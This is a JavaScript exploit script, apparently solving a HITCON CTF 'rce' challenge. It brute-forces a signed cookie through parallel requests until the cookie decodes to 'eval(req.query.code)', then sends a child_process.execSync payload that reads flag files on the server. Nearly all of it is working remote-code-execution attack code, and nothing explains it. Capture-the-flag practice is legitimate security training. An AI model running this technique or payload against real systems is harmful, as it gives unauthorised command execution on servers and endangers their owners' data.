
// const HOST = '127.0.0.1:5000'
const HOST = '1pojptpnpg.rce.chal.hitconctf.com'
const target = Buffer.from('eval(req.query.code)').toString('hex');
const payload = 'require("child_process").execSync("cat /flag*").toString()';

const parseCookie = s => s.match(/code=(.+);/)[1];

(async function () {
    let cookie = await fetch(`http://${HOST}/`).then(r => parseCookie(r.headers.get('set-cookie')));
    console.log("init cookie: %s", cookie);
    console.log("target = %s", target)
    for (let i = 0; i < 40; ++i) {
        while (true) {
            const res = await Promise.all(
                Array(32).fill().map(_ =>
                    fetch(`http://${HOST}/random`,
                        { headers: { cookie: `code=${cookie}` } })
                        .then(r => parseCookie(r.headers.get('set-cookie')))
                )
            );
            let _cookie = res.filter(cookie => target.startsWith(cookie.match(/s%3A(\w*)\..+/)[1]))[0];
            if (_cookie !== undefined) {
                cookie = _cookie
                break;
            }
        }
        console.log("cookie %s", cookie)
    }
    const res = await fetch(`http://${HOST}/random?code=${encodeURIComponent(payload)}`,
        { headers: { cookie: `code=${cookie}` } }).then(r => r.json());
    console.log(res.result)
})();